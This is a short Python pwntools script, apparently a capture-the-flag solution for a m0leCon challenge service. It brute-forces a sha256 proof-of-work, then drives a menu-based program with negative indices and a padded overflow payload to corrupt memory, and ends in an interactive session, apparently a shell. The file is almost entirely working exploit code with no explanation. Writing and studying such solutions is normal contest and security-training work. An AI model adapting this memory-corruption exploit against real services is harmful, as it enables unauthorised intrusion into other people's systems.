#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

# SETTINGS

IP = "challs.m0lecon.it"
PORT = 2123

context.log_level = "DEBUG"

r = remote(IP, PORT)


r.recvuntil("Give me a string starting with ")
pref = r.recvuntil(' ')[:-1].decode()
r.recvuntil("sha256sum ends in ")
end = r.recvline()[:-2].decode()

i = 0

while True:
    s = pref + str(i)
    if sha256(s.encode()).hexdigest().endswith(end):
        break
    i += 1

r.sendline(s)


# SPLOIT #
r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('1')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-1')

r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('2')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-2')

r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-3')

r.recvuntil('>')
r.sendline('4')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('A' * 24 + chr(0x60 - 8))

r.recvuntil('>')
r.sendline('6')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('1')

r.recvuntil('>')
r.sendline('5')
r.recvuntil(': ')
r.sendline('2')

r.interactive()
